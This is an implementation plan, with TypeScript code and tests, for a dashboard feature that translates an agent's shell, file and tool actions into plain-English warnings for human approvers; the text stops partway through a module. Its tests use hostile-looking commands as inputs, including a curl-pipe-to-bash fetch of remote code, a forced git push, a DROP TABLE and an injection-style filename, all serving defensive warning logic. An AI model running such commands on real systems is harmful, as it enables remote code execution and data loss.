# Plain-Language Action Translation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Render one plain-English sentence above the raw command on the `/approvals` card, so a non-technical operator can judge what they are approving instead of rubber-stamping shell syntax.

**Architecture:** A new pure-function module `app/lib/plain-language/` turns a stored action row plus its guard-decision `intel` into a `PlainDescription` (headline, warnings, confidence). It runs at read time in `app/api/actions/route.ts`, never in the hook and never on the guard hot path. The Python bash classifier stays the sole authority on risk; a deliberately dumb TypeScript parser only names nouns for the sentence. Unrecognised actions return `confidence: 'unknown'` and render an honest "I can't read this one" card rather than a guess.

**Tech Stack:** TypeScript, Next.js 16 App Router, vitest, Postgres via repositories.

**Spec:** `docs/superpowers/specs/2026-08-11-plain-language-action-translation-design.md`

## Global Constraints

- **Deterministic only.** No LLM call, no network, no filesystem, no DB access anywhere under `app/lib/plain-language/**`. Every function is pure and synchronous.
- **The never-guess rule.** A rule that does not recognise an action returns `confidence: 'unknown'`. It never falls back to a vague sentence like "Runs a program on your computer".
- **The calm-sentence invariant.** A calm headline must never render next to `risk_score >= 70` or `reversible === false`. Enforced centrally by `applySafetyFloor()`; no translator may bypass it.
- **Errors fail toward alarm.** Every degraded path yields less reassurance, never more. Missing input caps confidence at `partial`; it never produces a calm sentence.
- **No schema change, no hook change, no migration.** Do not edit anything under `hooks/`, `drizzle/`, or `schema/`.
- **All new source files are `.ts`.** Importers must also be `.ts` — Turbopack will not resolve a `.js` → `.ts` import, which passes vitest and then 500s at runtime.
- **Tests are `.js`** in `__tests__/unit/`, using `import { describe, it, expect } from 'vitest'` and the `@/lib/...` path alias, matching `__tests__/unit/guard-intel.test.js`.
- **No hardcoded hex values** in any UI change. Use the CSS tokens in `app/globals.css` and the Tailwind theme. Read `.impeccable.md` before touching UI.
- **No direct SQL in route files.** All DB access goes through `app/lib/repositories/*.repository.ts`.
- **Gates before push:** `npm run lint`, `npx vitest run` (full suite), `npm run typecheck`, `npx next build`.
- **SHARED TREE — another Claude Code agent is working in this repo.** Never run `git add -A`, `git add .`, `git stash`, `git checkout -- <path>`, or `git reset` on anything you did not create. Stage **explicit paths only**, and run `git status --short` before every commit to confirm nothing foreign is staged. If a file you need to modify has uncommitted changes you did not make, **stop and report it** rather than editing over them. Re-read every shared file with the Read tool immediately before editing it — `app/api/actions/route.ts`, `app/approvals/page.tsx` and `app/lib/repositories/actions.repository.ts` are all high-churn and may have drifted since this plan was written.

---

## File Structure

**Create:**

| File | Responsibility |
|---|---|
| `app/lib/plain-language/types.ts` | `PlainDescription`, `Confidence`, calm-rule registry, `unknownDescription()`, `applySafetyFloor()` |
| `app/lib/plain-language/tools.ts` | MCP calls and the generic tool bucket; the tool-phrase registry |
| `app/lib/plain-language/files.ts` | `Write` / `Edit` / `MultiEdit` / `NotebookEdit`, driven by `intel.file` |
| `app/lib/plain-language/parse-shell.ts` | Shallow shell tokeniser — nouns only, never risk |
| `app/lib/plain-language/bash.ts` | Shell rule table producing sentences from parsed stages + `intel.bash` |
| `app/lib/plain-language/index.ts` | `describeAction()` dispatcher; applies the safety floor |

**Modify:**

| File | Change |
|---|---|
| `app/lib/guard/types.ts:42-47` | Extend `intel` with `bash` and `file` shapes |
| `app/lib/repositories/actions.repository.ts` | Add `getGuardContextsByIds()` |
| `app/api/actions/route.ts` | On the `pending_approval` path, attach `plain` to each row |
| `app/approvals/page.tsx:449-455` | Render headline / warnings / irreversibility band / "Exact command" |
| `app/decisions/[actionId]/_components/PoliciesTab.tsx` | Render the same block |
| `app/lib/notification-adapters/index.ts` | Use the headline in Telegram / email cards |

---

### Task 1: Type foundation and the safety floor

This is the safety core. Everything else depends on it.

**Files:**
- Create: `app/lib/plain-language/types.ts`
- Modify: `app/lib/guard/types.ts:42-47`
- Test: `__tests__/unit/plain-language-safety-floor.test.js`

**Interfaces:**
- Consumes: nothing.
- Produces: `PlainDescription`, `Confidence`, `CALM_RULE_IDS`, `unknownDescription(ruleId: string): PlainDescription`, `applySafetyFloor(desc: PlainDescription, riskScore: number): PlainDescription`. Extended `GuardContext['intel']` with `bash` and `file` members.

- [ ] **Step 1: Write the failing test**

Create `__tests__/unit/plain-language-safety-floor.test.js`:

```js
import { describe, it, expect } from 'vitest';
import { applySafetyFloor, unknownDescription } from '@/lib/plain-language/types';

function calm() {
  return {
    headline: 'Lists the files in a folder.',
    warnings: ['Reads only, changes nothing.'],
    confidence: 'high',
    reversible: true,
    ruleId: 'bash.read',
  };
}

describe('applySafetyFloor', () => {
  it('replaces a calm sentence when the risk score is high', () => {
    const out = applySafetyFloor(calm(), 85);
    expect(out.confidence).toBe('unknown');
    expect(out.headline).not.toContain('Lists the files');
    expect(out.warnings.join(' ')).toContain('Trust the command');
  });

  it('leaves a calm sentence alone when the risk score is low', () => {
    const out = applySafetyFloor(calm(), 10);
    expect(out.headline).toBe('Lists the files in a folder.');
    expect(out.confidence).toBe('high');
  });

  it('leaves a non-calm sentence alone even at high risk', () => {
    const scary = { ...calm(), headline: 'Deletes the build folder.', ruleId: 'bash.delete' };
    const out = applySafetyFloor(scary, 85);
    expect(out.headline).toBe('Deletes the build folder.');
  });

  it('trips on irreversibility even when the score is low', () => {
    const out = applySafetyFloor({ ...calm(), reversible: false }, 5);
    expect(out.confidence).toBe('unknown');
  });

  it('passes an already-unknown description straight through', () => {
    const u = unknownDescription('tool.unregistered');
    expect(applySafetyFloor(u, 90)).toEqual(u);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- __tests__/unit/plain-language-safety-floor.test.js`
Expected: FAIL — cannot resolve `@/lib/plain-language/types`.

- [ ] **Step 3: Create the types module**

Create `app/lib/plain-language/types.ts`:

```ts
/**
 * Plain-language translation of a governed action.
 *
 * Read-time only. Every function in this module is pure and synchronous —
 * no LLM, no network, no I/O. See
 * docs/superpowers/specs/2026-08-11-plain-language-action-translation-design.md
 */

export type Confidence = 'high' | 'partial' | 'unknown';

export interface PlainDescription {
  /** One sentence, present tense, second person. The card headline. */
  headline: string;
  /** The specifics: which file, which host, which branch. Shown as data. */
  detail?: string;
  /** Plain-English warnings, worst first. Drawn only from fixed phrases. */
  warnings: string[];
  confidence: Confidence;
  reversible: boolean | 'unknown';
  /** Which rule produced this. Used by golden tests and the safety floor. */
  ruleId: string;
}

/**
 * Rules whose headline tells the operator "relax". These are the only
 * headlines the safety floor polices, because a false calm is the one
 * failure that turns the approvals queue back into a rubber stamp.
 */
export const CALM_RULE_IDS: ReadonlySet<string> = new Set([
  'bash.read',
  'file.read',
  'tool.read',
  'conversation',
]);

export const UNKNOWN_HEADLINE = "I can't tell you what this one does in plain English.";

export const UNKNOWN_DETAIL =
  'Nothing here matched a rule I trust. Read the command below, or ask someone who reads code before approving.';

export function unknownDescription(ruleId: string): PlainDescription {
  return {
    headline: UNKNOWN_HEADLINE,
    detail: UNKNOWN_DETAIL,
    warnings: [],
    confidence: 'unknown',
    reversible: 'unknown',
    ruleId,
  };
}

/**
 * The calm-sentence invariant.
 *
 * "Lists the files in a folder" next to a red 85 tells the operator the plain
 * text is unreliable, and they stop reading it for good. When our rule reads
 * an action as routine but the classifier scored it dangerous, the rule is the
 * thing that is wrong — so we withdraw the sentence rather than contradict the
 * score.
 */
export function applySafetyFloor(desc: PlainDescription, riskScore: number): PlainDescription {
  if (desc.confidence === 'unknown') return desc;
  const dangerous = riskScore >= 70 || desc.reversible === false;
  if (!dangerous || !CALM_RULE_IDS.has(desc.ruleId)) return desc;
  return {
    ...unknownDescription('safety-floor'),
    warnings: [
      'This was scored as high risk, but my plain-English rule read it as routine. Trust the command below, not the sentence.',
    ],
  };
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npm test -- __tests__/unit/plain-language-safety-floor.test.js`
Expected: PASS, 5 tests.

- [ ] **Step 5: Extend the guard intel type**

In `app/lib/guard/types.ts`, replace the `intel` member (currently lines 42-47):

```ts
  intel?: {
    branch?: { freshness: string; commits_behind?: number; name?: string };
    mcp?: { healthy?: boolean; server?: string };
    green?: { observed_level?: string };
    tool?: { required_permission?: string };
    /**
     * Emitted by hooks/dashclaw_agent_intel/bash_classifier.py via
     * _enrich_bash. The classifier is the sole authority on risk — the
     * plain-language module reads these and never recomputes them.
     */
    bash?: {
      intent?: 'destructive' | 'write' | 'network' | 'read' | 'unknown';
      risk_score?: number;
      reversible?: boolean;
      validations?: Array<{ check?: string; reason?: string; severity?: string }>;
    };
    /** Emitted by _enrich_file in hooks/dashclaw_pretool.py. */
    file?: {
      sensitive_path?: boolean;
      traversal_detected?: boolean;
      outside_workspace?: boolean;
    };
  };
```

- [ ] **Step 6: Verify the type change compiles**

Run: `npm run typecheck`
Expected: PASS. The `[field: string]: unknown` index signature at line 49 already permitted these keys, so no call site should break.

- [ ] **Step 7: Commit**

```bash
git add app/lib/plain-language/types.ts app/lib/guard/types.ts __tests__/unit/plain-language-safety-floor.test.js
git commit -m "feat(plain-language): type foundation and calm-sentence safety floor"
```

---

### Task 2: Tool and MCP translator

Start here rather than with Bash: it is the smallest translator, and it establishes the registry pattern and the honest-unknown path that every other translator reuses.

**Files:**
- Create: `app/lib/plain-language/tools.ts`
- Test: `__tests__/unit/plain-language-tools.test.js`

**Interfaces:**
- Consumes: `PlainDescription`, `unknownDescription` from `types.ts`.
- Produces: `describeMcp(payload: string, server?: string): PlainDescription`, `describeGenericTool(label: string, payload: string): PlainDescription`, `TOOL_PHRASES`.

Background the implementer needs: `_enrich_mcp` (`hooks/dashclaw_pretool.py:599`) sets `declared_goal` to `"MCP: " + tool_name` where `tool_name` is the full `mcp__<server>__<method>` string. `_enrich_default` (`:634`) sets it to `"<ToolName>: " + JSON.stringify(tool_input)`. `Read` is **not** in `_FILE_TOOLS` (`:227`) so it arrives through the generic path.

- [ ] **Step 1: Write the failing test**

Create `__tests__/unit/plain-language-tools.test.js`:

```js
import { describe, it, expect } from 'vitest';
import { describeMcp, describeGenericTool } from '@/lib/plain-language/tools';

describe('describeMcp', () => {
  it('uses the registry phrase for a known DashClaw tool', () => {
    const out = describeMcp('mcp__dashclaw-local__dashclaw_guard');
    expect(out.confidence).toBe('high');
    expect(out.headline).toBe('Asks DashClaw whether this action is allowed.');
  });

  it('names the server and tool instead of guessing for an unknown tool', () => {
    const out = describeMcp('mcp__acme__send_invoice');
    expect(out.confidence).toBe('unknown');
    expect(out.detail).toContain('send_invoice');
    expect(out.detail).toContain('acme');
    expect(out.headline).not.toContain('invoice');
  });

  it('returns unknown for a malformed mcp name', () => {
    expect(describeMcp('not-an-mcp-name').confidence).toBe('unknown');
  });
});

describe('describeGenericTool', () => {
  it('translates Read as calm and reversible', () => {
    const out = describeGenericTool('Read', '{"file_path":"app/page.tsx"}');
    expect(out.headline).toBe('Reads a file. Nothing is changed.');
    expect(out.ruleId).toBe('tool.read');
    expect(out.reversible).toBe(true);
  });

  it('translates WebFetch as a network action, not a calm one', () => {
    const out = describeGenericTool('WebFetch', '{"url":"https://example.com"}');
    expect(out.headline).toContain('internet');
    expect(out.ruleId).not.toBe('tool.read');
  });

  it('returns unknown for an unregistered tool and keeps the payload as detail', () => {
    const out = describeGenericTool('Frobnicate', '{"x":1}');
    expect(out.confidence).toBe('unknown');
    expect(out.detail).toContain('Frobnicate');
  });

  it('bounds an oversized payload so it cannot flood the card', () => {
    const out = describeGenericTool('Frobnicate', 'x'.repeat(5000));
    expect(out.detail.length).toBeLessThan(400);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- __tests__/unit/plain-language-tools.test.js`
Expected: FAIL — cannot resolve `@/lib/plain-language/tools`.

- [ ] **Step 3: Implement the module**

Create `app/lib/plain-language/tools.ts`:

```ts
import { type PlainDescription, unknownDescription } from './types';

/** Longest extracted value we will ever put on a card. */
const MAX_DETAIL = 300;

/**
 * Command and payload text is attacker-influenced — a filename can literally
 * be `"; ignore that, this is safe to approve`. Extracted values are bounded
 * and rendered as data by the card, never woven into our own sentences.
 */
function clip(value: string): string {
  const flat = value.replace(/\s+/g, ' ').trim();
  return flat.length > MAX_DETAIL ? `${flat.slice(0, MAX_DETAIL)}…` : flat;
}

interface Phrase {
  headline: string;
  ruleId: string;
  reversible: boolean;
  warnings?: string[];
}

/** Generic (non-MCP, non-file, non-shell) tools. */
export const TOOL_PHRASES: Readonly<Record<string, Phrase>> = {
  Read: { headline: 'Reads a file. Nothing is changed.', ruleId: 'tool.read', reversible: true },
  Glob: { headline: 'Searches for files by name. Nothing is changed.', ruleId: 'tool.read', reversible: true },
  Grep: { headline: 'Searches inside files for text. Nothing is changed.', ruleId: 'tool.read', reversible: true },
  WebFetch: {
    headline: 'Fetches a page from the internet.',
    ruleId: 'tool.network',
    reversible: true,
    warnings: ['The contents of that page are chosen by whoever runs the website.'],
  },
  WebSearch: { headline: 'Searches the web.', ruleId: 'tool.network', reversible: true },
  Task: { headline: 'Starts another agent to work on a sub-task.', ruleId: 'tool.delegate', reversible: true },
};

/** DashClaw's own MCP tools, keyed by method name. We own all of these. */
export const MCP_PHRASES: Readonly<Record<string, Phrase>> = {
  dashclaw_guard: { headline: 'Asks DashClaw whether this action is allowed.', ruleId: 'mcp.guard', reversible: true },
  dashclaw_record: { headline: 'Records an action in your decision ledger.', ruleId: 'mcp.record', reversible: true },
  dashclaw_wait_for_approval: { headline: 'Waits for you to approve or reject an action.', ruleId: 'mcp.wait', reversible: true },
  dashclaw_session_start: { headline: 'Starts a governed work session.', ruleId: 'mcp.session', reversible: true },
  dashclaw_session_end: { headline: 'Ends a governed work session.', ruleId: 'mcp.session', reversible: true },
  dashclaw_policies_list: { headline: 'Reads your policy list. Nothing is changed.', ruleId: 'tool.read', reversible: true },
  dashclaw_decisions_recent: { headline: 'Reads recent decisions. Nothing is changed.', ruleId: 'tool.read', reversible: true },
  dashclaw_capabilities_list: { headline: 'Reads the capability list. Nothing is changed.', ruleId: 'tool.read', reversible: true },
  dashclaw_assumption_record: { headline: 'Records an assumption the agent is relying on.', ruleId: 'mcp.record', reversible: true },
  dashclaw_plan_submit: { headline: 'Submits a plan for you to review before work starts.', ruleId: 'mcp.plan', reversible: true },
  dashclaw_plan_status: { headline: 'Checks whether a submitted plan was approved.', ruleId: 'tool.read', reversible: true },
  dashclaw_task_create: { headline: 'Creates a task.', ruleId: 'mcp.task', reversible: true },
  dashclaw_task_update: { headline: 'Updates a task.', ruleId: 'mcp.task', reversible: true },
  dashclaw_task_event: { headline: 'Adds an event to a task.', ruleId: 'mcp.task', reversible: true },
  dashclaw_pair: { headline: 'Pairs this agent with your DashClaw workspace.', ruleId: 'mcp.pair', reversible: true },
  dashclaw_invoke: { headline: 'Runs a governed capability.', ruleId: 'mcp.invoke', reversible: true },
  dashclaw_session_retro: { headline: 'Writes a session retrospective.', ruleId: 'mcp.record', reversible: true },
  dashclaw_status: { headline: 'Reads DashClaw status. Nothing is changed.', ruleId: 'tool.read', reversible: true },
};

function fromPhrase(p: Phrase): PlainDescription {
  return {
    headline: p.headline,
    warnings: p.warnings ? [...p.warnings] : [],
    confidence: 'high',
    reversible: p.reversible,
    ruleId: p.ruleId,
  };
}

/**
 * `payload` is the full `mcp__<server>__<method>` tool name, taken verbatim
 * from declared_goal after the "MCP: " prefix.
 */
export function describeMcp(payload: string, server?: string): PlainDescription {
  const parts = payload.split('__');
  if (parts.length < 3 || parts[0] !== 'mcp') return unknownDescription('mcp.malformed');

  const resolvedServer = server || parts[1] || 'unknown';
  const method = parts.slice(2).join('__');

  const known = MCP_PHRASES[method];
  if (known) return fromPhrase(known);

  // Never invent a description. Name the server and the tool so the operator
  // has something concrete to ask about.
  const u = unknownDescription('mcp.unregistered');
  return {
    ...u,
    detail: clip(
      `This uses a tool called "${method}" from the "${resolvedServer}" server. I don't have a description for it.`,
    ),
  };
}

export function describeGenericTool(label: string, payload: string): PlainDescription {
  const known = TOOL_PHRASES[label];
  if (known) return fromPhrase(known);

  const u = unknownDescription('tool.unregistered');
  return {
    ...u,
    detail: clip(`This uses a tool called "${label}". I don't have a description for it. It was called with: ${payload}`),
  };
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npm test -- __tests__/unit/plain-language-tools.test.js`
Expected: PASS, 7 tests.

- [ ] **Step 5: Commit**

```bash
git add app/lib/plain-language/tools.ts __tests__/unit/plain-language-tools.test.js
git commit -m "feat(plain-language): MCP and generic tool translator with honest unknowns"
```

---

### Task 3: File tool translator

**Files:**
- Create: `app/lib/plain-language/files.ts`
- Test: `__tests__/unit/plain-language-files.test.js`

**Interfaces:**
- Consumes: `PlainDescription`, `unknownDescription` from `types.ts`.
- Produces: `describeFile(label: string, path: string, fileIntel?: FileIntel): PlainDescription` where `FileIntel = { sensitive_path?: boolean; traversal_detected?: boolean; outside_workspace?: boolean }`.

Background: `_enrich_file` (`hooks/dashclaw_pretool.py:528-573`) handles `Write`, `Edit`, `MultiEdit`, `NotebookEdit`. `declared_goal` is `"<ToolName>: <path>"`, `target` is the path, and `intel.file` carries the three booleans. The hook cannot tell whether a `Write` target already exists, so the plan does not claim it — "Creates or replaces" is the honest phrasing for `Write`.

- [ ] **Step 1: Write the failing test**

Create `__tests__/unit/plain-language-files.test.js`:

```js
import { describe, it, expect } from 'vitest';
import { describeFile } from '@/lib/plain-language/files';

describe('describeFile', () => {
  it('describes a Write without claiming whether the file already existed', () => {
    const out = describeFile('Write', 'app/api/billing/route.ts');
    expect(out.confidence).toBe('high');
    expect(out.headline).toBe('Creates or replaces a file in your project.');
    expect(out.detail).toBe('app/api/billing/route.ts');
  });

  it('describes an Edit as a change to an existing file', () => {
    const out = describeFile('Edit', 'app/page.tsx');
    expect(out.headline).toBe('Changes an existing file in your project.');
  });

  it('warns when the file holds credentials', () => {
    const out = describeFile('Write', '.env.local', { sensitive_path: true });
    expect(out.warnings.join(' ')).toContain('credentials');
  });

  it('warns when the file is outside the project folder', () => {
    const out = describeFile('Write', '/etc/hosts', { outside_workspace: true });
    expect(out.warnings.join(' ')).toContain('outside your project folder');
  });

  it('warns on path traversal', () => {
    const out = describeFile('Write', '../../secrets', { traversal_detected: true });
    expect(out.warnings.join(' ')).toContain('outside the folder it named');
  });

  it('stacks every warning that applies, worst first', () => {
    const out = describeFile('Write', '../../.env', { sensitive_path: true, traversal_detected: true, outside_workspace: true });
    expect(out.warnings).toHaveLength(3);
    expect(out.warnings[0]).toContain('credentials');
  });

  it('returns unknown for an unrecognised file tool', () => {
    expect(describeFile('Frobnicate', 'x.txt').confidence).toBe('unknown');
  });

  it('returns unknown when the hook could not resolve a path', () => {
    expect(describeFile('Write', 'unknown').confidence).toBe('unknown');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- __tests__/unit/plain-language-files.test.js`
Expected: FAIL — cannot resolve `@/lib/plain-language/files`.

- [ ] **Step 3: Implement the module**

Create `app/lib/plain-language/files.ts`:

```ts
import { type PlainDescription, unknownDescription } from './types';

export interface FileIntel {
  sensitive_path?: boolean;
  traversal_detected?: boolean;
  outside_workspace?: boolean;
}

const MAX_PATH = 200;

/**
 * `_enrich_file` writes the literal string "unknown" when the tool input
 * carried no resolvable path. Treat that as no path at all rather than
 * describing a file called "unknown".
 */
const NO_PATH = 'unknown';

const FILE_HEADLINES: Readonly<Record<string, { headline: string; ruleId: string }>> = {
  // The hook cannot tell whether the target already exists, so we do not claim it.
  Write: { headline: 'Creates or replaces a file in your project.', ruleId: 'file.write' },
  Edit: { headline: 'Changes an existing file in your project.', ruleId: 'file.edit' },
  MultiEdit: { headline: 'Makes several changes to an existing file in your project.', ruleId: 'file.edit' },
  NotebookEdit: { headline: 'Changes a cell in a notebook file.', ruleId: 'file.edit' },
};

/** Fixed phrases only — no extracted text is ever woven into a warning. */
const SENSITIVE_WARNING = 'This file holds credentials or configuration.';
const TRAVERSAL_WARNING = 'This path reaches outside the folder it named.';
const OUTSIDE_WARNING = 'This file is outside your project folder.';

export function describeFile(label: string, path: string, fileIntel?: FileIntel): PlainDescription {
  const known = FILE_HEADLINES[label];
  if (!known) return unknownDescription('file.unregistered');
  if (!path || path === NO_PATH) return unknownDescription('file.no-path');

  // Worst first: credentials, then traversal, then location.
  const warnings: string[] = [];
  if (fileIntel?.sensitive_path) warnings.push(SENSITIVE_WARNING);
  if (fileIntel?.traversal_detected) warnings.push(TRAVERSAL_WARNING);
  if (fileIntel?.outside_workspace) warnings.push(OUTSIDE_WARNING);

  return {
    headline: known.headline,
    detail: path.length > MAX_PATH ? `${path.slice(0, MAX_PATH)}…` : path,
    warnings,
    confidence: 'high',
    // File edits are recoverable from version control; the hook agrees
    // (_enrich_file hardcodes reversible: True).
    reversible: true,
    ruleId: known.ruleId,
  };
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npm test -- __tests__/unit/plain-language-files.test.js`
Expected: PASS, 8 tests.

- [ ] **Step 5: Commit**

```bash
git add app/lib/plain-language/files.ts __tests__/unit/plain-language-files.test.js
git commit -m "feat(plain-language): file tool translator driven by intel.file"
```

---

### Task 4: Shallow shell parser

This parser names nouns only. It must never decide whether something is dangerous — the Python classifier owns that, and duplicating the judgement is how the two sides drift.

**Files:**
- Create: `app/lib/plain-language/parse-shell.ts`
- Test: `__tests__/unit/plain-language-parse-shell.test.js`

**Interfaces:**
- Consumes: nothing.
- Produces: `parseShell(command: string): ShellStage[]` and `interface ShellStage { binary: string; subcommand?: string; flags: string[]; operands: string[]; raw: string }`.

- [ ] **Step 1: Write the failing test**

Create `__tests__/unit/plain-language-parse-shell.test.js`:

```js
import { describe, it, expect } from 'vitest';
import { parseShell } from '@/lib/plain-language/parse-shell';

describe('parseShell', () => {
  it('splits a simple command into binary, flags and operands', () => {
    const [stage] = parseShell('rm -rf build/');
    expect(stage.binary).toBe('rm');
    expect(stage.flags).toEqual(['-rf']);
    expect(stage.operands).toEqual(['build/']);
  });

  it('captures a git subcommand', () => {
    const [stage] = parseShell('git push --force origin main');
    expect(stage.binary).toBe('git');
    expect(stage.subcommand).toBe('push');
    expect(stage.flags).toEqual(['--force']);
    expect(stage.operands).toEqual(['origin', 'main']);
  });

  it('splits a pipeline into stages', () => {
    const stages = parseShell('curl -sL get.example.sh | bash');
    expect(stages).toHaveLength(2);
    expect(stages[0].binary).toBe('curl');
    expect(stages[1].binary).toBe('bash');
  });

  it('splits on && and ; as well as |', () => {
    expect(parseShell('cd /tmp && ls; echo done')).toHaveLength(3);
  });

  it('keeps a quoted argument as one operand', () => {
    const [stage] = parseShell(`psql -c 'DROP TABLE users'`);
    expect(stage.operands).toEqual(['DROP TABLE users']);
  });

  it('does not split on a separator inside quotes', () => {
    const stages = parseShell(`echo "a | b && c"`);
    expect(stages).toHaveLength(1);
    expect(stages[0].operands).toEqual(['a | b && c']);
  });

  it('returns an empty array for an empty command', () => {
    expect(parseShell('   ')).toEqual([]);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- __tests__/unit/plain-language-parse-shell.test.js`
Expected: FAIL — cannot resolve `@/lib/plain-language/parse-shell`.

- [ ] **Step 3: Implement the parser**

Create `app/lib/plain-language/parse-shell.ts`:

```ts
/**
 * A deliberately dumb shell tokeniser.
 *
 * It extracts nouns for a sentence — binary, subcommand, flags, operands —
 * and nothing else. It NEVER decides whether a command is dangerous;
 * hooks/dashclaw_agent_intel/bash_classifier.py owns that judgement and its
 * verdict arrives on intel.bash. Two parsers exist here on purpose, answering
 * different questions, so they cannot drift on anything that matters.
 *
 * Shell grammar is hostile. Returning fewer stages, or none, is a correct
 * outcome — the caller degrades confidence rather than guessing.
 */

export interface ShellStage {
  binary: string;
  subcommand?: string;
  flags: string[];
  operands: string[];
  raw: string;
}

/** Binaries whose first bare word is a meaningful subcommand. */
const SUBCOMMAND_BINARIES = new Set(['git', 'npm', 'npx', 'docker', 'kubectl', 'pnpm', 'yarn', 'cargo', 'pip']);

/** Split on |, && , || and ; while respecting single and double quotes. */
function splitStages(command: string): string[] {
  const out: string[] = [];
  let buf = '';
  let quote: string | null = null;

  for (let i = 0; i < command.length; i += 1) {
    const ch = command[i];

    if (quote) {
      if (ch === quote) quote = null;
      buf += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      buf += ch;
      continue;
    }
    if (ch === ';' || ch === '|' || ch === '&') {
      // Consume a doubled operator (&& or ||) as one separator.
      if ((ch === '&' || ch === '|') && command[i + 1] === ch) i += 1;
      // A single & is backgrounding, not a separator we care about.
      out.push(buf);
      buf = '';
      continue;
    }
    buf += ch;
  }
  out.push(buf);
  return out.map((s) => s.trim()).filter(Boolean);
}

/** Split a stage into words, keeping quoted runs together and unquoting them. */
function tokenise(stage: string): string[] {
  const out: string[] = [];
  let buf = '';
  let quote: string | null = null;
  let quoted = false;

  const flush = () => {
    if (buf || quoted) out.push(buf);
    buf = '';
    quoted = false;
  };

  for (const ch of stage) {
    if (quote) {
      if (ch === quote) {
        quote = null;
      } else {
        buf += ch;
      }
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      quoted = true;
      continue;
    }
    if (ch === ' ' || ch === '\t' || ch === '\n') {
      flush();
      continue;
    }
    buf += ch;
  }
  flush();
  return out;
}

export function parseShell(command: string): ShellStage[] {
  return splitStages(command).map((raw) => {
    const tokens = tokenise(raw);
    const binary = tokens[0] || '';
    const rest = tokens.slice(1);

    const flags = rest.filter((t) => t.startsWith('-'));
    const bare = rest.filter((t) => !t.startsWith('-'));

    let subcommand: string | undefined;
    let operands = bare;
    if (SUBCOMMAND_BINARIES.has(binary) && bare.length > 0) {
      subcommand = bare[0];
      operands = bare.slice(1);
    }

    return { binary, subcommand, flags, operands, raw };
  }).filter((s) => s.binary !== '');
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npm test -- __tests__/unit/plain-language-parse-shell.test.js`
Expected: PASS, 7 tests.

- [ ] **Step 5: Commit**

```bash
git add app/lib/plain-language/parse-shell.ts __tests__/unit/plain-language-parse-shell.test.js
git commit -m "feat(plain-language): shallow shell parser for noun extraction"
```

---

### Task 5: Shell rule table

**Files:**
- Create: `app/lib/plain-language/bash.ts`
- Test: `__tests__/unit/plain-language-bash.test.js`

**Interfaces:**
- Consumes: `parseShell`, `ShellStage` from `parse-shell.ts`; `PlainDescription`, `unknownDescription` from `types.ts`; `BashIntel` shape from `app/lib/guard/types.ts`.
- Produces: `describeBash(command: string, bashIntel?: BashIntel): PlainDescription` where `BashIntel = { intent?: string; risk_score?: number; reversible?: boolean; validations?: Array<{check?: string; reason?: string}> }`.

Rules for the implementer:
- Every stage that matches a rule contributes a clause. Clauses join with `, then `.
- **If any stage is unrecognised, the whole result is `partial`.** A half-understood pipeline is exactly where a bad approval happens.
- If *no* stage is recognised, return `unknown`.
- `reversible` comes from `bashIntel.reversible` when present. When absent it is `'unknown'` — never assume `true`.
- The rule table below covers the spec's worked examples. It is a starting set, not a finished one; unmatched binaries returning `unknown` is the designed behaviour.

- [ ] **Step 1: Write the failing test**

Create `__tests__/unit/plain-language-bash.test.js`:

```js
import { describe, it, expect } from 'vitest';
import { describeBash } from '@/lib/plain-language/bash';

const destructive = { intent: 'destructive', reversible: false, risk_score: 85 };
const read = { intent: 'read', reversible: true, risk_score: 5 };

describe('describeBash', () => {
  it('translates a force push into its consequence, not its syntax', () => {
    const out = describeBash('git push --force origin main', destructive);
    expect(out.headline).toContain('Overwrites the shared code history');
    expect(out.headline).not.toContain('--force');
    expect(out.reversible).toBe(false);
    expect(out.warnings.join(' ')).toContain('other people');
  });

  it('translates a plain push differently from a force push', () => {
    const out = describeBash('git push origin main', { intent: 'network', reversible: true, risk_score: 20 });
    expect(out.headline).not.toContain('Overwrites');
  });

  it('flags curl-pipe-bash as running unseen code', () => {
    const out = describeBash('curl -sL get.example.sh | bash', { intent: 'network', risk_score: 75 });
    expect(out.headline).toContain('without showing it to you');
    expect(out.warnings.join(' ')).toContain('chooses what runs');
  });

  it('names the folder in an rm', () => {
    const out = describeBash('rm -rf build/', destructive);
    expect(out.headline).toContain('build/');
    expect(out.warnings.join(' ')).toContain('Recycle Bin');
  });

  it('translates a package install', () => {
    const out = describeBash('npm install left-pad', { intent: 'write', reversible: true, risk_score: 30 });
    expect(out.headline).toContain('left-pad');
    expect(out.confidence).toBe('high');
  });

  it('marks a read-only command calm', () => {
    const out = describeBash('ls -la', read);
    expect(out.ruleId).toBe('bash.read');
    expect(out.warnings.join(' ')).toContain('Reads only');
  });

  it('drops to partial when one stage of a pipeline is unrecognised', () => {
    const out = describeBash('ls -la | frobnicate', read);
    expect(out.confidence).toBe('partial');
    expect(out.headline).toContain("can't read");
  });

  it('returns unknown when no stage matches a rule', () => {
    expect(describeBash('frobnicate --wibble', {}).confidence).toBe('unknown');
  });

  it('never claims reversibility the classifier did not assert', () => {
    const out = describeBash('rm -rf build/', {});
    expect(out.reversible).toBe('unknown');
  });

  it('joins multiple recognised stages in order', () => {
    const out = describeBash('npm install left-pad && ls', { intent: 'write', reversible: true, risk_score: 30 });
    expect(out.headline).toContain(', then ');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- __tests__/unit/plain-language-bash.test.js`
Expected: FAIL — cannot resolve `@/lib/plain-language/bash`.

- [ ] **Step 3: Implement the rule table**

Create `app/lib/plain-language/bash.ts`:

```ts
import { parseShell, type ShellStage } from './parse-shell';
import { type PlainDescription, unknownDescription } from './types';

export interface BashIntel {
  intent?: string;
  risk_score?: number;
  reversible?: boolean;
  validations?: Array<{ check?: string; reason?: string }>;
}

interface Clause {
  text: string;
  warnings: string[];
  ruleId: string;
}

const MAX_OPERAND = 80;

/** Extracted values are bounded; the card renders them as data, not as prose. */
